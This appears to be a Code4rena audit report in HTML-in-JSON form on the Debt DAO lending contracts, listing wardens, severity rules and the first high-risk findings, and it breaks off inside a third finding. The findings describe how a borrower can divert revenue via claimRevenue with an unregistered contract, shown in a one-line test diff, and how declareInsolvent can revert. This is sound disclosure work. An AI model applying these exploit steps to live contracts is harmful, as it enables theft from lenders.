{
  "circa": {
    "title": "Debt DAO contest",
    "sponsor": "Debt DAO",
    "slug": "2022-11-debtdao",
    "date": "2023-02-07",
    "findings": "https://github.com/code-423n4/2022-11-debtdao-findings/issues",
    "contest": 174
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit contest outlined in this document, C4 conducted an analysis of the Debt DAO smart contract system written in Solidity. The audit contest took place between November 3—November 10 2022.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>123 Wardens contributed reports to the Debt DAO contest:</p>\n<ol>\n<li>0x1f8b</li>\n<li>0x52</li>\n<li><a href=\"https://twitter.com/0xNazgul\">0xNazgul</a></li>\n<li><a href=\"https://twitter.com/0xRajkumar\">0xRajkumar</a></li>\n<li><a href=\"https://twitter.com/0xRoxas\">0xRoxas</a></li>\n<li><a href=\"https://twitter.com/0xSmartContract\">0xSmartContract</a></li>\n<li>0xbepresent</li>\n<li>0xdeadbeef0x</li>\n<li><a href=\"https://twitter.com/8olidity\">8olidity</a></li>\n<li>Amithuddar</li>\n<li>Awesome</li>\n<li><a href=\"https://github.com/Aymen1001\">Aymen0909</a></li>\n<li>B2</li>\n<li>BClabs (nalus and Reptilia)</li>\n<li>Bnke0x0</li>\n<li><a href=\"https://twitter.com/0xch301\">Ch_301</a></li>\n<li>Deekshith99</li>\n<li><a href=\"https://twitter.com/Deivitto\">Deivitto</a></li>\n<li>Diana</li>\n<li>Dinesh11G</li>\n<li><a href=\"https://instagram.com/vanensurya\">Funen</a></li>\n<li>HE1M</li>\n<li>HardlyCodeMan</li>\n<li>IllIllI</li>\n<li><a href=\"https://twitter.com/sm4rtcontr4ct\">JC</a></li>\n<li><a href=\"https://jeiwan.net\">Jeiwan</a></li>\n<li>Josiah</li>\n<li>KingNFT</li>\n<li>Koolex</li>\n<li>Lambda</li>\n<li>Metatron</li>\n<li><a href=\"https://twitter.com/Nyksx__\">Nyx</a></li>\n<li>PaludoX0</li>\n<li>R2</li>\n<li><a href=\"https://www.linkedin.com/in/nhan-vo-a9473019a/\">Rahoz</a></li>\n<li>RaymondFam</li>\n<li>RedOneN</li>\n<li>ReyAdmirado</li>\n<li>Rolezn</li>\n<li><a href=\"https://twitter.com/0xruhum\">Ruhum</a></li>\n<li>Saintcode_</li>\n<li><a href=\"https://twitter/@Satyam33sharma\">Satyam_Sharma</a></li>\n<li>SmartSek (0xDjango and hake)</li>\n<li><a href=\"https://mobile.twitter.com/tomj_bb\">TomJ</a></li>\n<li><a href=\"https://tom-sol.notion.site/Who-am-I-3b4dc28e77b647eb90794735a94dd38e\">Tomo</a></li>\n<li><a href=\"https://twitter.com/trust__90\">Trust</a></li>\n<li>__141345__</li>\n<li><a href=\"https://twitter.com/a12jmx\">a12jmx</a></li>\n<li><a href=\"https://github.com/romeroadrian\">adriro</a></li>\n<li>ajtra</li>\n<li>aphak5010</li>\n<li>apostle0x01</li>\n<li>ayeslick</li>\n<li>bananasboys (miguelmtzinf and <a href=\"https://twitter.com/zer0dots\">zer0dot</a>)</li>\n<li><a href=\"https://twitter.com/berndartmueller\">berndartmueller</a></li>\n<li><a href=\"https://twitter.com/bin2chen\">bin2chen</a></li>\n<li>brgltd</li>\n<li>btk</li>\n<li>bulej93</li>\n<li><a href=\"https://twitter.com/c3ph_\">c3phas</a></li>\n<li><a href=\"https://twitter.com/carlitox477\">carlitox477</a></li>\n<li>catwhiskeys</li>\n<li>cccz</li>\n<li>ch0bu</li>\n<li>chaduke</li>\n<li>chrisdior4</li>\n<li>cloudjunky</li>\n<li>codexploder</li>\n<li>corerouter</li>\n<li>cryptonue</li>\n<li>cryptostellar5</li>\n<li>cryptphi</li>\n<li><a href=\"https://twitter.com/csanuragjain\">csanuragjain</a></li>\n<li>ctf_sec</li>\n<li>d3e4</li>\n<li>datapunk</li>\n<li>delfin454000</li>\n<li>djxploit</li>\n<li><a href=\"https://github.com/lyciumlee\">durianSausage</a></li>\n<li>eierina</li>\n<li>eighty</li>\n<li>emrekocak</li>\n<li>erictee</li>\n<li>everyanykey</li>\n<li>exolorkistis</li>\n<li><a href=\"https://twitter.com/father0fBl0cks\">fatherOfBlocks</a></li>\n<li><a href=\"https://www.linkedin.com/in/georgi-nikolaev-georgiev-978253219\">gogo</a></li>\n<li><a href=\"https://twitter.com/hansfriese\">hansfriese</a></li>\n<li>i_got_hacked</li>\n<li>immeas</li>\n<li><a href=\"https://twitter.com/JoeStakey\">joestakey</a></li>\n<li>jumpdest7d</li>\n<li>karanctf</li>\n<li>ladboy233</li>\n<li>lotux</li>\n<li>lukris02</li>\n<li><a href=\"https://github.com/martin-petrov03\">martin</a></li>\n<li>mcwildy</li>\n<li>me_na0mi</li>\n<li>merlin</li>\n<li><a href=\"https://www.linkedin.com/in/minhquanym/\">minhquanym</a></li>\n<li><a href=\"https://twitter.com/andyfeili\">oyc_109</a></li>\n<li>pashov</li>\n<li>peanuts</li>\n<li>pedr02b2</li>\n<li>perseverancesuccess</li>\n<li>rbserver</li>\n<li>rotcivegaf</li>\n<li>rvierdiiev</li>\n<li>sakman</li>\n<li><a href=\"https://medium.com/@saneryee-studio\">saneryee</a></li>\n<li><a href=\"https://twitter.com/seynixyz\">seyni</a></li>\n<li>shark</li>\n<li>slowmoses</li>\n<li><a href=\"https://github.com/SmilingHeretic\">smiling_heretic</a></li>\n<li>tnevler</li>\n<li>trustindistrust</li>\n<li>w0Lfrum</li>\n<li><a href=\"https://www.linkedin.com/in/yurahod/\">yurahod</a></li>\n<li>zaskoh</li>\n</ol>\n<p>This contest was judged by <a href=\"https://twitter.com/lsdan_defi\">LSDan</a>.</p>\n<p>Final report assembled by <a href=\"https://twitter.com/itsmetechjay\">itsmetechjay</a>.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 17 unique vulnerabilities. Of these vulnerabilities, 6 received a risk rating in the category of HIGH severity and 11 received a risk rating in the category of MEDIUM severity.</p>\n<p>Additionally, C4 analysis included 78 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 42 reports recommending gas optimizations.</p>\n<p>All of the issues presented here are linked back to their original finding.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2022-11-debtdao\">C4 Debt DAO contest repository</a>, and is composed of 17 smart contracts written in the Solidity programming language and includes 2,511 lines of Solidity code.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities according to a methodology based on <a href=\"https://owasp.org/www-community/OWASP_Risk_Rating_Methodology\">OWASP standards</a>.</p>\n<p>Vulnerabilities are divided into three primary risk categories: high, medium, and low/non-critical.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>Further information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code4rena.com\">the C4 website</a>.</p>\n<h1 id=\"high-risk-findings-6\" style=\"position:relative;\"><a href=\"#high-risk-findings-6\" aria-label=\"high risk findings 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (6)</h1>\n<h2 id=\"h-01-call-to-declareinsolvent-would-revert-when-contract-status-reaches-liquidation-point-after-repayment-of-credit-position-1\" style=\"position:relative;\"><a href=\"#h-01-call-to-declareinsolvent-would-revert-when-contract-status-reaches-liquidation-point-after-repayment-of-credit-position-1\" aria-label=\"h 01 call to declareinsolvent would revert when contract status reaches liquidation point after repayment of credit position 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/69\">[H-01] Call to <code>declareInsolvent()</code> would revert when contract status reaches liquidation point after repayment of credit position 1</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/69\">cryptphi</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/329\">adriro</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/316\">Ch_301</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/211\">PaludoX0</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/166\">ayeslick</a>, and <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/150\">perseverancesuccess</a></em></p>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/LineOfCredit.sol#L143\">https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/LineOfCredit.sol#L143</a></p>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/LineOfCredit.sol#L83-L86\">https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/LineOfCredit.sol#L83-L86</a></p>\n<h3 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The modifier <code>whileBorrowing()</code> is used along in the call to LineOfCredit.declareInsolvent(). However this check reverts when count == 0 or <code>credits[ids[0]].principal == 0</code> . Within the contract, any lender can add credit which adds an entry in credits array, credits[ids].</p>\n<p>Assume, when borrower chooses lender positions including credits[ids[0]] to draw on, and repays back the loan fully for credits[ids[1]], then the call to declareInsolvent() by the arbiter would revert since it does not pass the <code>whileBorrowing()</code> modifier check due to the ids array index shift in the call to  stepQ(), which would shift ids[1] to ids[0], thereby making the condition for <code>credits[ids[0]].principal == 0</code> be true causing the revert.</p>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ol>\n<li>LineOfCredit contract is set up and 5 lenders have deposited into the contract.</li>\n<li>Alice, the borrower borrows credit from these 5 credit positions including by calling <code>LineOfCredit.borrow()</code> for the position ids.</li>\n<li>Later Alice pays back the loan for  credit position id 1 just before the contract gets liquidated.</li>\n<li>At the point where <code>ids.stepQ()</code> is called in <code>\\_repay()</code>, position 1 is moved to ids[0]</li>\n<li>When contract status is LIQUIDATABLE, no loan drawn on credit position 0 and arbiter calls declareInsolvent() , the call would revert since <code>credits[ids[0]].principal == 0</code></li>\n</ol>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The modifier <code>whileBorrowing()</code> would need to be reviewed and amended.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/69\">dmvt (judge) increased severity to High</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/69\">kibagateaux (Debt DAO) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-02-non-existing-revenue-contract-can-be-passed-to-claimrevenue-to-send-all-tokens-to-treasury\" style=\"position:relative;\"><a href=\"#h-02-non-existing-revenue-contract-can-be-passed-to-claimrevenue-to-send-all-tokens-to-treasury\" aria-label=\"h 02 non existing revenue contract can be passed to claimrevenue to send all tokens to treasury permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/119\">[H-02] Non-existing revenue contract can be passed to claimRevenue to send all tokens to treasury</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/119\">Lambda</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/462\">berndartmueller</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/317\">adriro</a>, and <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/70\">aphak5010</a></em></p>\n<p>Neither <code>SpigotLib.claimRevenue</code> nor <code>SpigotLib._claimRevenue</code> check that the provided <code>revenueContract</code> was registered before. If this is not the case, <code>SpigotLib._claimRevenue</code> assumes that this is a revenue contract with push payments (because <code>self.settings[revenueContract].claimFunction</code> is 0) and just returns the difference since the last call to <code>claimRevenue</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">self</span><span class=\"mtk1\">.</span><span class=\"mtk12\">settings</span><span class=\"mtk1\">[</span><span class=\"mtk12\">revenueContract</span><span class=\"mtk1\">].</span><span class=\"mtk12\">claimFunction</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">bytes4</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// push payments</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// claimed = total balance - already accounted for balance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">claimed</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">existingBalance</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">self</span><span class=\"mtk1\">.</span><span class=\"mtk12\">escrowed</span><span class=\"mtk1\">[</span><span class=\"mtk12\">token</span><span class=\"mtk1\">]; </span><span class=\"mtk3\">//@audit Rebasing tokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// underflow revert ensures we have more tokens than we started with and actually claimed revenue</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span></code></pre>\n<p><code>SpigotLib.claimRevenue</code> will then read <code>self.settings[revenueContract].ownerSplit</code>, which is 0 for non-registered revenue contracts:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">escrowedAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">claimed</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">self</span><span class=\"mtk1\">.</span><span class=\"mtk12\">settings</span><span class=\"mtk1\">[</span><span class=\"mtk12\">revenueContract</span><span class=\"mtk1\">].</span><span class=\"mtk12\">ownerSplit</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">100</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>Therefore, the whole <code>claimed</code> amount is sent to the treasury.</p>\n<p>This becomes very problematic for revenue tokens that use push payments. An attacker (in practice the borrower) can just regularly call <code>claimRevenue</code> with this token and a non-existing revenue contract. All of the tokens that were sent to the spigot since the last call will be sent to the treasury and none to the escrow, i.e. a borrower can ensure that no revenue will be available for the lender, no matter what the configured split is.</p>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof Of Concept</h3>\n<p>As mentioned above, the attack pattern works for arbitrary tokens where one (or more) revenue contracts use push payments, i.e. where the balance of the Spigot increases from time to time. Then, the attacker just calls <code>claimRevenue</code> with a non-existing address. This is illustrated in the following diff:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/tests/Spigot.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/tests/Spigot.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -174,7 +174,7 @@ contract SpigotTest is Test {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         assertEq(token.balanceOf(address(spigot)), totalRevenue);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         bytes memory claimData;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        spigot.claimRevenue(revenueContract, address(token), claimData);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        spigot.claimRevenue(address(0), address(token), claimData);</span></span></span></code></pre>\n<p>Thanks to this small modification, all of the tokens are sent to the treasury and none are sent to the escrow.</p>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Check that a revenue contract was registered before, revert if it does not.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/119\">kibagateaux (Debt DAO) confirmed</a></strong> </p>\n<hr>\n<h2 id=\"h-03-addcredit--increasecredit-cannot-be-called-by-lender-first-when-token-is-eth\" style=\"position:relative;\"><a href=\"#h-03-addcredit--increasecredit-cannot-be-called-by-lender-first-when-token-is-eth\" aria-label=\"h 03 addcredit  increasecredit cannot be called by lender first when token is eth permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 